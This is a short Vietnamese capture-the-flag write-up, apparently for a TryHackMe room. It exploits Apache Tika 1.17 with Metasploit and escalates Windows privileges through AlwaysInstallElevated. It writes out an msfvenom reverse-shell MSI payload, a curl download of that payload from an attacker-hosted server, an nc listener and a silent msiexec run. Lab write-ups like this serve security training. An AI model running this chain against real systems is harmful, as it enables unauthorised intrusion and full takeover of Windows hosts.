ở bài này sẽ quét ra nhiều cổng nên mình khuyên nên quét bằng AttackBox của THM

<img width="1031" height="652" alt="image" src="https://github.com/user-attachments/assets/52676d00-d242-451a-9aa5-55ef82f5485f" />

mình sẽ thấy cổng 61777 đang chạy Apache Tika 1.17 Server và kết hợp với Wappalyzer cho biết server đang chạy là windows

<img width="497" height="508" alt="image" src="https://github.com/user-attachments/assets/a5dd5464-e69e-444e-af7a-1db753ea82ba" />

khi mà tìm từ khóa `Apache Tika 1.17 Server vuln` thì sẽ tìm đc script của `metasploit`

<img width="1288" height="392" alt="Screenshot 2026-04-19 220029" src="https://github.com/user-attachments/assets/cc0d6b81-4daf-4af3-b51f-755f85788203" />

set up xong xuôi rồi cho nó chạy, bạn sẽ vào được shell của windows và tìm được username:password của CyberLens để **RDP** vào

<img width="1832" height="324" alt="image" src="https://github.com/user-attachments/assets/6a662576-a465-4579-8513-44f049756e5b" />

check xem windows bạn có lỗ hổng gì để leo quyền

<img width="683" height="194" alt="image" src="https://github.com/user-attachments/assets/47f385e0-6787-449c-ad1d-6990517d5bdb" />

2 lỗ hổng nãy phải được bật cùng lúc thì mới leo quyền được (0x1)

sau đó tạo 1 payload `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi` rồi up lên windows

mở cổng chứa file malicious ở máy kali `python3 -m http.server 8000` rồi dùng cmd của windows tải về bằng command: `curl http://IP:8000/malicious.msi -o C:\Users\CyberLens\Documents\Management\smalicious.msi`

mở thêm cổng của payload vừa tải (ví dụ ở đây mình dùng cổng 4445 thì dùng command `nc -lvnp 4445`)

file `malicious.msi` ở path nào thì thực thi ở đó `msiexec /quiet /qn /i C:\Users\CyberLens\Documents\Management\smalicious.msi`

quay lại xem cổng nc 4445 vừa mở hổi nãy, gõ `whoami` để biết mình đã leo quyền chưa rồi lục từng file để tìm admin flag thôi

<img width="1037" height="315" alt="image" src="https://github.com/user-attachments/assets/8f4eab68-4e74-4358-b070-e28142a415db" />






